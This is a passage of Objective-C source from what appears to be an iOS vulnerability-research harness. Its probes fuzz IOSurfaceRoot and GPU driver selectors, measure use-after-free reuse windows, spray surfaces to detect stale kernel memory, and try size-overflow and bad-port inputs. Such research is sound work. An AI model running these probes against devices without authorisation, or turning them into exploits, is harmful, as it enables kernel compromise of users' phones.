                done(@{@"status": @"FAIL", @"reason": @"matching"});
                return;
            }
            io_service_t service = sym.getMatch(MACH_PORT_NULL, criteria);
            if (!service) {
                log(@"MACH: FAIL IOSurfaceRoot not visible");
                isr_unload(&sym);
                done(@{@"status": @"FAIL", @"reason": @"service"});
                return;
            }
            io_connect_t conn = MACH_PORT_NULL;
            kern_return_t openKr = sym.open(service, mach_task_self(), 0, &conn);
            if (openKr != KERN_SUCCESS || conn == MACH_PORT_NULL) {
                log([NSString stringWithFormat:@"MACH: FAIL open kr=0x%08x", (unsigned)openKr]);
                sym.release(service);
                isr_unload(&sym);
                done(@{@"status": @"FAIL", @"reason": @"open"});
                return;
            }

            unsigned attempted = 0, accepted = 0, rejected = 0, anomalies = 0;
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

            const unsigned maxSelector = 32;

            // Input patterns to try per selector
            typedef struct {
                const char *label;
                unsigned nScalarIn;
                uint64_t scalarIn[4];
                size_t structInSize;
            } ISRInput;

            ISRInput inputs[] = {
                {"empty",     0, {0},          0},
                {"zero_1",    1, {0},          0},
                {"one_1",     1, {1},          0},
                {"max_1",     1, {UINT64_MAX}, 0},
                {"two_zeros", 2, {0, 0},       0},
                {"mixed",     2, {1, UINT64_MAX}, 0},
                {"struct_24", 0, {0},          24},
                {"struct_64", 0, {0},          64},
            };
            const unsigned nInputs = sizeof(inputs) / sizeof(inputs[0]);

            uint8_t structBuf[256];
            memset(structBuf, 0, sizeof(structBuf));

            for (unsigned sel = 0; sel <= maxSelector && !isr_stopped(); sel++) {
                for (unsigned inp = 0; inp < nInputs && !isr_stopped(); inp++) {
                    @autoreleasepool {
                        ISRInput *in = &inputs[inp];

                        isr_checkpoint(@"ISR-Mach-checkpoint.json", @{
                            @"status": @"RUNNING",
                            @"selector": @(sel),
                            @"input": [NSString stringWithUTF8String:in->label],
                            @"case": @(attempted)
                        });

                        uint64_t scalarOut[4] = {0};
                        uint32_t scalarOutCount = 4;
                        uint8_t structOut[256] = {0};
                        size_t structOutSize = sizeof(structOut);

                        attempted++;
                        kern_return_t kr = sym.call(
                            conn, sel,
                            in->nScalarIn > 0 ? in->scalarIn : NULL,
                            in->nScalarIn,
                            in->structInSize > 0 ? structBuf : NULL,
                            in->structInSize,
                            scalarOut, &scalarOutCount,
                            structOut, &structOutSize
                        );

                        if (kr == KERN_SUCCESS) {
                            accepted++;
                            log([NSString stringWithFormat:
                                @"MACH: ACCEPTED sel=%u input=%s scalarOut=%u structOut=%zu",
                                sel, in->label, scalarOutCount, structOutSize]);

                            // Log scalar outputs
                            for (uint32_t i = 0; i < scalarOutCount && i < 4; i++) {
                                log([NSString stringWithFormat:
                                    @"MACH:   scalarOut[%u] = 0x%016llx", i, scalarOut[i]]);
                            }

                            // Check if struct output contains interesting data
                            if (structOutSize > 0) {
                                BOOL allZero = YES;
                                for (size_t i = 0; i < structOutSize && i < 64; i++) {
                                    if (structOut[i] != 0) { allZero = NO; break; }
                                }
                                if (!allZero) {
                                    NSMutableString *hex = [NSMutableString new];
                                    size_t showBytes = MIN(structOutSize, 64);
                                    for (size_t i = 0; i < showBytes; i++) {
                                        [hex appendFormat:@"%02x", structOut[i]];
                                        if ((i + 1) % 8 == 0) [hex appendString:@" "];
                                    }
                                    log([NSString stringWithFormat:
                                        @"MACH:   structOut[%zu]: %@%s",
                                        structOutSize, hex, structOutSize > 64 ? "..." : ""]);
                                }
                            }
                        } else {
                            rejected++;
                        }

                        // Detect anomalous return codes
                        if (kr != KERN_SUCCESS &&
                            kr != KERN_INVALID_ARGUMENT &&
                            kr != KERN_NOT_SUPPORTED &&
                            kr != 0xe00002c2 && // kIOReturnBadArgument
                            kr != 0xe00002bc && // kIOReturnUnsupported
                            kr != 0xe00002be && // kIOReturnNotPermitted
                            kr != 0xe0000001 && // kIOReturnError
                            kr != 0xe00002cd)   // kIOReturnNotReady
                        {
                            anomalies++;
                            log([NSString stringWithFormat:
                                @"MACH: ANOMALY sel=%u input=%s unexpected kr=0x%08x",
                                sel, in->label, (unsigned)kr]);
                        }
                    }
                }
                log([NSString stringWithFormat:@"MACH: selector %u complete (%u/%u)", sel, attempted, (maxSelector+1)*nInputs]);
            }

            sym.close(conn);
            sym.release(service);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"MACH: DONE attempted=%u accepted=%u rejected=%u anomalies=%u elapsed=%.3fs",
                attempted, accepted, rejected, anomalies, elapsed]);

            if (accepted > 0) {
                log([NSString stringWithFormat:
                    @"MACH: %u selectors accepted calls — review output for information leaks", accepted]);
            }
            if (anomalies > 0) {
                log([NSString stringWithFormat:
                    @"MACH: %u unexpected return codes — may indicate unhandled edge cases", anomalies]);
            }

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"attempted": @(attempted),
                @"accepted": @(accepted),
                @"rejected": @(rejected),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-Mach-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 6: Timed Race (Round 2)

void iosurface_research_timed_race(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"TIMED_RACE: ERROR — failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"TIMED_RACE: === Precision UAF Window Detector ===");
            log(@"TIMED_RACE: Creating surfaces, measuring destroy-to-reuse timing");

            mach_timebase_info_data_t tbi;
            mach_timebase_info(&tbi);

            uint32_t uafWindows = 0;
            uint32_t staleHits = 0;
            uint32_t anomalies = 0;
            uint32_t trials = 200;
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

            for (uint32_t t = 0; t < trials && !isr_stopped(); t++) {
                isr_checkpoint(@"ISR-TimedRace-checkpoint.json", @{
                    @"trial": @(t), @"uafWindows": @(uafWindows), @"staleHits": @(staleHits)
                });

                NSDictionary *params = isr_default_surface_params(64, 64);
                IOSurfaceRef s1 = sym.create((__bridge CFDictionaryRef)params);
                if (!s1) continue;
                IOSurfaceID id1 = sym.getID(s1);

                // Lock and write a marker pattern
                sym.lock(s1, 0, NULL);
                void *base1 = sym.getBase(s1);
                if (base1) {
                    memset(base1, 0xAB, MIN(sym.getAllocSize(s1), (size_t)256));
                }
                sym.unlock(s1, 0, NULL);

                // Measure time from release to reuse
                uint64_t t_before = mach_absolute_time();
                CFRelease(s1);
                // Immediately try to create a new one
                IOSurfaceRef s2 = sym.create((__bridge CFDictionaryRef)params);
                uint64_t t_after = mach_absolute_time();

                if (!s2) continue;
                IOSurfaceID id2 = sym.getID(s2);

                uint64_t delta_ns = (t_after - t_before) * tbi.numer / tbi.denom;

                if (id2 == id1) {
                    uafWindows++;
                    // Check if old data persists in new surface (kernel memory leak)
                    sym.lock(s2, 3, NULL); // read-only
                    void *base2 = sym.getBase(s2);
                    BOOL staleData = NO;
                    if (base2) {
                        uint8_t *p = (uint8_t *)base2;
                        int markerCount = 0;
                        for (int i = 0; i < 256 && i < (int)sym.getAllocSize(s2); i++) {
                            if (p[i] == 0xAB) markerCount++;
                        }
                        if (markerCount > 128) {
                            staleData = YES;
                            staleHits++;
                            anomalies++;
                        }
                    }
                    sym.unlock(s2, 0, NULL);

                    if (t % 20 == 0 || staleData) {
                        log([NSString stringWithFormat:
                            @"TIMED_RACE: trial=%u ID_REUSED id=%u delta=%lluns staleData=%s",
                            t, id1, delta_ns, staleData ? "YES" : "NO"]);
                    }
                }
                CFRelease(s2);
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"TIMED_RACE: DONE trials=%u uafWindows=%u staleHits=%u anomalies=%u elapsed=%.3fs",
                trials, uafWindows, staleHits, anomalies, elapsed]);

            if (staleHits > 0) {
                log([NSString stringWithFormat:
                    @"TIMED_RACE: CRITICAL — %u surfaces retained stale data after recycle (kernel memory leak)", staleHits]);
            }

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"trials": @(trials),
                @"uafWindows": @(uafWindows),
                @"staleHits": @(staleHits),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-TimedRace-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 7: Pixel Buffer Leak (Round 2)

void iosurface_research_buffer_leak(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"BUFLEAK: ERROR — failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"BUFLEAK: === Pixel Buffer Cross-Surface Leak Detector ===");
            log(@"BUFLEAK: Tests if freed surface memory leaks into newly allocated surfaces");

            uint32_t anomalies = 0;
            uint32_t leaksDetected = 0;
            uint32_t partialLeaks = 0;
            uint32_t trials = 100;
            // Test multiple surface sizes — the allocator may behave differently
            size_t sizes[][2] = {{32,32},{64,64},{128,128},{256,256},{512,512},{1024,1024},{16,1024},{1024,16}};
            int nSizes = sizeof(sizes)/sizeof(sizes[0]);
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

            for (int si = 0; si < nSizes && !isr_stopped(); si++) {
                size_t w = sizes[si][0], h = sizes[si][1];
                NSDictionary *params = isr_default_surface_params(w, h);
                uint32_t sizeLeaks = 0;
                uint32_t sizePartials = 0;

                log([NSString stringWithFormat:@"BUFLEAK: testing %zux%zu (%zu bytes)", w, h, w*4*h]);

                for (uint32_t t = 0; t < trials && !isr_stopped(); t++) {
                    isr_checkpoint(@"ISR-BufLeak-checkpoint.json", @{
                        @"size": [NSString stringWithFormat:@"%zux%zu", w, h],
                        @"trial": @(t), @"leaks": @(leaksDetected)
                    });

                    // Phase 1: Create surface, write unique pattern
                    uint8_t marker = (uint8_t)((t * 37 + si * 13) & 0xFF);
                    if (marker == 0) marker = 0xCD;

                    IOSurfaceRef victim = sym.create((__bridge CFDictionaryRef)params);
                    if (!victim) continue;

                    sym.lock(victim, 0, NULL);
                    void *vbase = sym.getBase(victim);
                    size_t allocSz = sym.getAllocSize(victim);
                    size_t fillSz = MIN(allocSz, (size_t)4096);
                    if (vbase) {
                        memset(vbase, marker, fillSz);
                    }
                    sym.unlock(victim, 0, NULL);

                    // Phase 2: Destroy victim
                    CFRelease(victim);

                    // Phase 3: Allocate N new surfaces, check each for stale marker
                    int sprayCount = 4;
                    IOSurfaceRef sprayed[4] = {};
                    for (int s = 0; s < sprayCount; s++) {
                        sprayed[s] = sym.create((__bridge CFDictionaryRef)params);
                    }

                    for (int s = 0; s < sprayCount; s++) {
                        if (!sprayed[s]) continue;
                        sym.lock(sprayed[s], 3, NULL);
                        void *sbase = sym.getBase(sprayed[s]);
                        if (sbase) {
                            uint8_t *p = (uint8_t *)sbase;
                            size_t checkSz = MIN(sym.getAllocSize(sprayed[s]), (size_t)4096);
                            int markerCount = 0;
                            for (size_t i = 0; i < checkSz; i++) {
                                if (p[i] == marker) markerCount++;
                            }
                            double ratio = (double)markerCount / checkSz;
                            if (ratio > 0.8) {
                                sizeLeaks++;
                                leaksDetected++;
                                anomalies++;
                                log([NSString stringWithFormat:
                                    @"BUFLEAK: LEAK %zux%zu trial=%u spray=%d marker=0x%02x ratio=%.1f%%",
                                    w, h, t, s, marker, ratio * 100]);
                            } else if (ratio > 0.1) {
                                sizePartials++;
                                partialLeaks++;
                                log([NSString stringWithFormat:
                                    @"BUFLEAK: PARTIAL %zux%zu trial=%u spray=%d marker=0x%02x ratio=%.1f%%",
                                    w, h, t, s, marker, ratio * 100]);
                            }
                        }
                        sym.unlock(sprayed[s], 0, NULL);
                    }
                    for (int s = 0; s < sprayCount; s++) {
                        if (sprayed[s]) CFRelease(sprayed[s]);
                    }
                }

                log([NSString stringWithFormat:
                    @"BUFLEAK: %zux%zu done — leaks=%u partial=%u", w, h, sizeLeaks, sizePartials]);
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"BUFLEAK: DONE trials=%u leaks=%u partial=%u anomalies=%u elapsed=%.3fs",
                trials * nSizes, leaksDetected, partialLeaks, anomalies, elapsed]);

            if (leaksDetected > 0) {
                log([NSString stringWithFormat:
                    @"BUFLEAK: CRITICAL — %u full leaks: freed surface data readable by new allocations", leaksDetected]);
            }

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"totalTrials": @(trials * nSizes),
                @"leaksDetected": @(leaksDetected),
                @"partialLeaks": @(partialLeaks),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-BufLeak-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 8: IOKit Connection Types (Round 2)

void iosurface_research_conn_types(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"CONN: ERROR — failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"CONN: === IOKit Connection Type Scanner ===");
            log(@"CONN: Testing IOSurfaceRoot with connection types 0-15 and alternate tasks");

            CFDictionaryRef match = sym.matching("IOSurfaceRoot");
            if (!match) {
                log(@"CONN: ERROR — IOSurfaceRoot not found");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            // We need multiple match dicts since IOServiceGetMatchingService consumes them
            uint32_t accepted = 0;
            uint32_t rejected = 0;
            uint32_t anomalies = 0;
            uint32_t maxType = 15;
            CFAbsoluteTime startTime = CFAbsoluteTimeGetCurrent();

            // Phase A: Connection types 0-15 on IOSurfaceRoot
            log(@"CONN: Phase A — connection types 0-15");
            for (uint32_t connType = 0; connType <= maxType && !isr_stopped(); connType++) {
                isr_checkpoint(@"ISR-Conn-checkpoint.json", @{
                    @"phase": @"A", @"connType": @(connType), @"accepted": @(accepted)
                });

                CFDictionaryRef m = sym.matching("IOSurfaceRoot");
                if (!m) continue;
                io_service_t svc = sym.getMatch(MACH_PORT_NULL, m);
                if (!svc) continue;

                io_connect_t conn = 0;
                kern_return_t kr = sym.open(svc, mach_task_self(), connType, &conn);

                if (kr == KERN_SUCCESS && conn) {
                    accepted++;
                    log([NSString stringWithFormat:
                        @"CONN: ACCEPTED type=%u conn=0x%x", connType, conn]);

                    // Try selectors 0-5 on this connection type
                    for (uint32_t sel = 0; sel <= 5; sel++) {
                        uint64_t scalarOut[4] = {};
                        uint32_t scalarOutCnt = 4;
                        kern_return_t skr = sym.call(conn, sel, NULL, 0, NULL, 0,
                                                      scalarOut, &scalarOutCnt, NULL, NULL);
                        if (skr == KERN_SUCCESS) {
                            anomalies++;
                            log([NSString stringWithFormat:
                                @"CONN: ANOMALY type=%u sel=%u ACCEPTED scalarOut[0]=0x%llx",
                                connType, sel, scalarOut[0]]);
                        }
                    }
                    sym.close(conn);
                } else {
                    rejected++;
                    if (kr != KERN_INVALID_ARGUMENT &&
                        kr != 0xe00002be && // kIOReturnNotPermitted
                        kr != 0xe00002bc && // kIOReturnUnsupported
                        kr != 0xe0000001)   // kIOReturnError
                    {
                        anomalies++;
                        log([NSString stringWithFormat:
                            @"CONN: UNEXPECTED type=%u kr=0x%08x", connType, (unsigned)kr]);
                    }
                }
                sym.release(svc);
            }

            // Phase B: Try opening with different task ports
            log(@"CONN: Phase B — alternate task port variants");
            struct { mach_port_t port; const char *label; } tasks[] = {
                { mach_task_self(), "self" },
                { MACH_PORT_NULL, "null" },
                { 1, "port_1" },
                { MACH_PORT_DEAD, "dead" },
            };
            int nTasks = sizeof(tasks)/sizeof(tasks[0]);

            for (int ti = 0; ti < nTasks && !isr_stopped(); ti++) {
                CFDictionaryRef m2 = sym.matching("IOSurfaceRoot");
                if (!m2) continue;
                io_service_t svc2 = sym.getMatch(MACH_PORT_NULL, m2);
                if (!svc2) continue;

                io_connect_t conn2 = 0;
                kern_return_t kr2 = sym.open(svc2, tasks[ti].port, 0, &conn2);

                if (kr2 == KERN_SUCCESS && conn2) {
                    log([NSString stringWithFormat:
                        @"CONN: ACCEPTED task=%s conn=0x%x", tasks[ti].label, conn2]);
                    if (tasks[ti].port != mach_task_self()) {
                        anomalies++;
                        log([NSString stringWithFormat:
                            @"CONN: ANOMALY — non-self task '%s' accepted!", tasks[ti].label]);
                    }
                    sym.close(conn2);
                } else {
                    log([NSString stringWithFormat:
                        @"CONN: REJECTED task=%s kr=0x%08x", tasks[ti].label, (unsigned)kr2]);
                }
                sym.release(svc2);
            }

            // Phase C: Try other IOSurface-related services
            log(@"CONN: Phase C — related IOKit services");
            const char *services[] = {
                "IOSurfaceRoot",
                "IOSurfaceClient",
                "IOGraphicsAccelerator2",
                "IOMobileGraphicsFamily",
                "AppleCLCD",
                "IOAccelerator",
                "AGXAccelerator",
                "AGXFamilyAccelerator",
            };
            int nServices = sizeof(services)/sizeof(services[0]);

            for (int si = 1; si < nServices && !isr_stopped(); si++) {
                CFDictionaryRef m3 = sym.matching(services[si]);
                if (!m3) continue;
                io_service_t svc3 = sym.getMatch(MACH_PORT_NULL, m3);
                if (!svc3) {
                    log([NSString stringWithFormat:@"CONN: service '%s' not found", services[si]]);
                    continue;
                }

                io_connect_t conn3 = 0;
                kern_return_t kr3 = sym.open(svc3, mach_task_self(), 0, &conn3);
                if (kr3 == KERN_SUCCESS && conn3) {
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"CONN: INTERESTING — '%s' opened! conn=0x%x", services[si], conn3]);
                    sym.close(conn3);
                } else {
                    log([NSString stringWithFormat:
                        @"CONN: '%s' rejected kr=0x%08x", services[si], (unsigned)kr3]);
                }
                sym.release(svc3);
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - startTime;
            log([NSString stringWithFormat:
                @"CONN: DONE accepted=%u rejected=%u anomalies=%u elapsed=%.3fs",
                accepted, rejected, anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"accepted": @(accepted),
                @"rejected": @(rejected),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-Conn-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 9: Alloc Boundary (Round 2)

void iosurface_research_alloc_boundary(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"BOUNDARY: ERROR — failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"BOUNDARY: === Allocation Boundary Scanner ===");
            log(@"BOUNDARY: Probing exact rejection thresholds and mismatch behavior");

            uint32_t anomalies = 0;
            uint32_t created = 0;
            uint32_t rejected = 0;
            uint32_t mismatchHits = 0;
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

            // Phase A: Binary search for exact max alloc threshold per width
            log(@"BOUNDARY: Phase A — binary search for max height at w=131071");
            size_t testW = 131071;
            size_t lo = 0, hi = 256;
            size_t lastAccepted = 0;

            while (lo <= hi && !isr_stopped()) {
                size_t mid = (lo + hi) / 2;
                if (mid == 0) { lo = 1; continue; }

                isr_checkpoint(@"ISR-Boundary-checkpoint.json", @{
                    @"phase": @"A", @"w": @(testW), @"testH": @(mid)
                });

                NSDictionary *params = isr_default_surface_params(testW, mid);
                IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)params);
                if (s) {
                    lastAccepted = mid;
                    lo = mid + 1;
                    log([NSString stringWithFormat:@"BOUNDARY: w=%zu h=%zu ACCEPTED alloc=%zu",
                        testW, mid, sym.getAllocSize(s)]);
                    CFRelease(s);
                } else {
                    hi = mid - 1;
                    log([NSString stringWithFormat:@"BOUNDARY: w=%zu h=%zu REJECTED", testW, mid]);
                }
            }
            log([NSString stringWithFormat:@"BOUNDARY: w=%zu max_h=%zu", testW, lastAccepted]);

            // Phase B: Test bytesPerRow / allocSize mismatches near the boundary
            log(@"BOUNDARY: Phase B — bytesPerRow/allocSize mismatches at boundary");
            struct {
                size_t w, h, bpr, allocSz;
                const char *label;
            } mismatchTests[] = {
                // Correct bytesPerRow but undersized allocSize
                { 1024, 1024, 4096, 1024,        "undersized_alloc" },
                { 1024, 1024, 4096, 4096*1024+1,  "oversized_alloc_by_1" },
                { 1024, 1024, 4096, 4096*1024-1,  "undersized_alloc_by_1" },
                // bytesPerRow smaller than width*bpe
                { 1024, 1024, 1024, 1024*1024,    "bpr_too_small" },
                // bytesPerRow = 0
                { 1024, 1024, 0,    4096*1024,    "bpr_zero" },
                // Huge bytesPerRow but small alloc
                { 32, 32, 0x7FFFFFFF, 4096,        "bpr_huge" },
                // allocSize = 0
                { 64, 64, 256, 0,                  "alloc_zero" },
                // w*bpe overflow: w=0x40000000, bpe=4 => w*bpe = 0 (overflow)
                { 0x40000000, 1, 0, 4,              "width_overflow" },
                // h very large with small w
                { 1, 0x40000000, 4, 0x40000000UL*4, "height_overflow" },
                // Mismatched pixel format
                { 64, 64, 256, 64*4*64,            "normal_baseline" },
            };
            int nMismatch = sizeof(mismatchTests)/sizeof(mismatchTests[0]);

            for (int i = 0; i < nMismatch && !isr_stopped(); i++) {
                isr_checkpoint(@"ISR-Boundary-checkpoint.json", @{
                    @"phase": @"B", @"test": @(mismatchTests[i].label)
                });

                NSMutableDictionary *p = [NSMutableDictionary dictionary];
                p[@"IOSurfaceWidth"] = @(mismatchTests[i].w);
                p[@"IOSurfaceHeight"] = @(mismatchTests[i].h);
                p[@"IOSurfaceBytesPerElement"] = @4;
                p[@"IOSurfacePixelFormat"] = @(0x42475241);
                if (mismatchTests[i].bpr > 0)
                    p[@"IOSurfaceBytesPerRow"] = @(mismatchTests[i].bpr);
                if (mismatchTests[i].allocSz > 0)
                    p[@"IOSurfaceAllocSize"] = @(mismatchTests[i].allocSz);

                IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)p);
                if (s) {
                    created++;
                    size_t actualW = sym.getWidth(s);
                    size_t actualH = sym.getHeight(s);
                    size_t actualAlloc = sym.getAllocSize(s);
                    BOOL wMismatch = (actualW != mismatchTests[i].w);
                    BOOL hMismatch = (actualH != mismatchTests[i].h);

                    log([NSString stringWithFormat:
                        @"BOUNDARY: CREATED '%s' w=%zu(req %zu) h=%zu(req %zu) alloc=%zu%s",
                        mismatchTests[i].label,
                        actualW, mismatchTests[i].w,
                        actualH, mismatchTests[i].h,
                        actualAlloc,
                        (wMismatch || hMismatch) ? " MISMATCH" : ""]);

                    if (wMismatch || hMismatch) {
                        mismatchHits++;
                    }

                    // Check if we can lock and access memory safely
                    kern_return_t lkr = sym.lock(s, 0, NULL);
                    if (lkr == KERN_SUCCESS) {
                        void *base = sym.getBase(s);
                        if (base && actualAlloc > 0) {
                            // Write and read back — detect if alloc is really that size
                            volatile uint8_t *vp = (volatile uint8_t *)base;
                            vp[0] = 0x42;
                            if (actualAlloc > 1) vp[actualAlloc - 1] = 0x43;
                            if (vp[0] != 0x42) {
                                anomalies++;
                                log([NSString stringWithFormat:
                                    @"BOUNDARY: ANOMALY '%s' — write/read mismatch at base!",
                                    mismatchTests[i].label]);
                            }
                        }
                        sym.unlock(s, 0, NULL);
                    }
                    CFRelease(s);
                } else {
                    rejected++;
                    log([NSString stringWithFormat:
                        @"BOUNDARY: REJECTED '%s'", mismatchTests[i].label]);
                }
            }

            // Phase C: Pixel format fuzzing — non-standard formats
            log(@"BOUNDARY: Phase C — pixel format edge cases");
            uint32_t formats[] = {
                0x42475241, // BGRA (normal)
                0x00000000, // zero
                0xFFFFFFFF, // max
                0x41524742, // ARGB (reversed)
                0x59555932, // YUV2
                0x4E563132, // NV12
                0x00000001, // unusual small value
                0x80000000, // high bit set
            };
            int nFormats = sizeof(formats)/sizeof(formats[0]);

            for (int fi = 0; fi < nFormats && !isr_stopped(); fi++) {
                NSDictionary *fp = @{
                    @"IOSurfaceWidth": @64,
                    @"IOSurfaceHeight": @64,
                    @"IOSurfaceBytesPerElement": @4,
                    @"IOSurfaceBytesPerRow": @(256),
                    @"IOSurfaceAllocSize": @(256 * 64),
                    @"IOSurfacePixelFormat": @(formats[fi])
                };
                IOSurfaceRef fs = sym.create((__bridge CFDictionaryRef)fp);
                if (fs) {
                    log([NSString stringWithFormat:
                        @"BOUNDARY: format=0x%08x CREATED alloc=%zu", formats[fi], sym.getAllocSize(fs)]);
                    CFRelease(fs);
                } else {
                    log([NSString stringWithFormat:
                        @"BOUNDARY: format=0x%08x REJECTED", formats[fi]]);
                }
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"BOUNDARY: DONE created=%u rejected=%u mismatches=%u anomalies=%u elapsed=%.3fs",
                created, rejected, mismatchHits, anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"created": @(created),
                @"rejected": @(rejected),
                @"mismatchHits": @(mismatchHits),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-Boundary-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 10: AGX Deep Scan (Round 3)

void iosurface_research_agx_scan(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"AGX: ERROR — failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"AGX: === GPU Driver Deep Scanner ===");
            log(@"AGX: Enumerating all GPU-related IOKit services and probing entry points");

            uint32_t anomalies = 0;
            uint32_t servicesFound = 0;
            uint32_t connectionsOpened = 0;
            uint32_t selectorsAccepted = 0;
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

            // Phase A: Broad service enumeration — GPU-related class names
            const char *gpuServices[] = {
                "AGXAccelerator",
                "AGXFamilyAccelerator",
                "AGXAcceleratorG13G",
                "AGXAcceleratorG13P",
                "AGXAcceleratorG14P",
                "AGXAcceleratorG15",
                "IOGPUDevice",
                "IOGPUCommandQueue",
                "IOGPUResource",
                "IOGPU",
                "IOAccelerator",
                "IOAcceleratorFamily2",
                "IOSurfaceRoot",
                "IOSurfaceAccelerator",
                "AppleM1ANE",
                "AppleSPU",
                "IOMobileGraphicsFamily",
                "AppleAVE2",
                "AppleJPEG",
                "IOSurface",
                "AppleMobileDispH13G",
                "AppleCLCD2",
                "IOMobileFramebuffer",
            };
            int nServices = sizeof(gpuServices) / sizeof(gpuServices[0]);

            log([NSString stringWithFormat:@"AGX: Phase A — scanning %d GPU/media services", nServices]);

            for (int si = 0; si < nServices && !isr_stopped(); si++) {
                isr_checkpoint(@"ISR-AGX-checkpoint.json", @{
                    @"phase": @"A", @"service": @(gpuServices[si]), @"found": @(servicesFound)
                });

                CFDictionaryRef m = sym.matching(gpuServices[si]);
                if (!m) continue;
                io_service_t svc = sym.getMatch(MACH_PORT_NULL, m);
                if (!svc) {
                    continue;
                }

                servicesFound++;
                log([NSString stringWithFormat:@"AGX: FOUND '%s'", gpuServices[si]]);

                // Try connection types 0-7 on each found service
                for (uint32_t ct = 0; ct <= 7 && !isr_stopped(); ct++) {
                    io_connect_t conn = 0;
                    kern_return_t kr = sym.open(svc, mach_task_self(), ct, &conn);

                    if (kr == KERN_SUCCESS && conn) {
                        connectionsOpened++;
                        log([NSString stringWithFormat:
                            @"AGX: OPENED '%s' type=%u conn=0x%x", gpuServices[si], ct, conn]);

                        // Probe selectors 0-20 on opened connection
                        for (uint32_t sel = 0; sel <= 20 && !isr_stopped(); sel++) {
                            // Pattern 1: empty call
                            uint64_t scalarOut[8] = {};
                            uint32_t scalarOutCnt = 8;
                            kern_return_t skr = sym.call(conn, sel,
                                NULL, 0, NULL, 0,
                                scalarOut, &scalarOutCnt, NULL, NULL);

                            if (skr == KERN_SUCCESS) {
                                selectorsAccepted++;
                                NSMutableString *vals = [NSMutableString new];
                                for (uint32_t i = 0; i < scalarOutCnt; i++) {
                                    [vals appendFormat:@"0x%llx ", scalarOut[i]];
                                }
                                log([NSString stringWithFormat:
                                    @"AGX: ACCEPTED '%s' type=%u sel=%u out=[%@]",
                                    gpuServices[si], ct, sel, vals]);
                            }

                            // Pattern 2: scalar inputs
                            uint64_t scalarIn[4] = {0, 0, 0, 0};
                            scalarOutCnt = 8;
                            memset(scalarOut, 0, sizeof(scalarOut));
                            skr = sym.call(conn, sel,
                                scalarIn, 4, NULL, 0,
                                scalarOut, &scalarOutCnt, NULL, NULL);

                            if (skr == KERN_SUCCESS) {
                                selectorsAccepted++;
                                log([NSString stringWithFormat:
                                    @"AGX: ACCEPTED '%s' type=%u sel=%u (with scalars)",
                                    gpuServices[si], ct, sel]);
                            }

                            // Pattern 3: struct input with IOSurface-like properties
                            uint8_t structIn[64] = {};
                            *(uint32_t *)structIn = 64;        // size field
                            *(uint32_t *)(structIn + 4) = 0x1; // type field
                            uint8_t structOut[256] = {};
